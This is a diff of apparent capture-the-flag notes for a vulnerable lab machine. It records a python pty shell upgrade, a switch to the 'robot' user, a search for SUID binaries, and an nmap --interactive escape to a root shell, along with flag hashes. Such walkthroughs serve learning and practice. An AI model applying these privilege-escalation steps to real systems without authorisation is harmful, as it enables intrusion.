@@ -105,7 +105,7 @@ PW: ER28-0652
 
                 1. cd /opt/bitnami/apps/wordpress/htdocs$ 
                 2. python -c ‘import pty; pty.spawn(”/bin/sh”)’
-                su robot
+                3. su robot
 
         G. Flag 2:
                 822c73956184f694993bede3eb39f959
@@ -114,4 +114,20 @@ PW: ER28-0652
 
                                     ##### FLAG 3 #####
 
-1.
+1. Escalate privilege
+        A. Find file with SUID bit
+              1. find / -perm /4000 -type f 2>/tmp/2
+
+              2. results used: /usr/local/bin/nmap
+
+        B. Use gtfobins.github.io
+              1. nmap
+              2. nmap --interactive
+              2. !sh
+
+2. Locate Flag 3
+        A. cd /root
+
+        B. Flag 3:
+                04787ddef27c3dee1ee161b21670b4e4
+
